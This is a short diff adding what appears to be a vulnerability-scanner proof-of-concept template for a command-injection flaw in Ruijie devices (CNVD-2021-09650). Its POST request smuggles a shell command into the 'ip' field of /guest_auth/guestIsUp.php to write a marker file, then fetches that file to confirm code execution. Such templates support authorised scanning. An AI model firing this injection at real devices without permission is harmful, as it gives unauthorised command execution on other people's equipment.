@@ -1,0 +1,21 @@
+name: ruijie-rce-cnvd-2021-09650
+set:
+    payload: randomLowercase(20)
+    randstr: randomLowercase(10)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /guest_auth/guestIsUp.php
+            body: |
+                mac=1&ip=127.0.0.1|echo '{{payload}}' > {{randstr}}.txt
+        expression: response.status == 200
+    r1:
+        request:
+            method: GET
+            path: /guest_auth/{{randstr}}.txt
+        expression: response.status == 200 && response.body.bcontains(bytes(payload))
+expression: r0() && r1()
+detail:
+    links:
+        - https://xz.aliyun.com/t/9016?page=1
